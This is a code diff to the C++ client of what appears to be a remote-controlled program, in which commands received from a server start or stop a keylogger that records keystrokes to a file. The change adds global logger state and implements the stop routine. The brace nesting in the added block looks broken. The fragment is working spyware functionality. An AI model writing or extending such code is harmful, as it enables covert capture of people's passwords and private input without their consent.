@@ -19,6 +19,9 @@ using namespace std;
 // Global variables for thread communication
 atomic<bool> running(true);
 LPTF_Socket* globalSocket = nullptr;
+static KeyLogger* globalLogger = nullptr;
+static std::thread keylogThread;
+
 
 // Thread function to handle server requests
 void serverRequestHandler() {
@@ -59,16 +62,22 @@ void serverRequestHandler() {
                     // Start or stop keylogger based on payload
                     std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
                     if (cmd == "start") {
-                        std::thread([]() {
-                            KeyLogger logger("key_file.txt");
-                            logger.start();
-                        }).detach();
-                    } else if (cmd == "stop") {
-                        std::cout << "[KEYLOG] Arrêt du keylogger non implémenté." << std::endl;
-                        // TODO: implement stop logic (UnhookWindowsHookEx)
-                    } else {
-                        std::cout << "[KEYLOG] Commande inconnue: " << cmd << std::endl;
-                    }
+                        if (!globalLogger) {
+                            globalLogger = new KeyLogger("key_file.txt");
+                            keylogThread = std::thread([]() {
+                                globalLogger->start();
+                            });
+                            keylogThread.detach();
+                            }
+                        }
+                        else if (cmd == "stop") {
+                            if (globalLogger) {
+                                globalLogger->stop();
+                                delete globalLogger;
+                                globalLogger = nullptr;
+                            }
+                        }
+
                     break;
                 }
                 
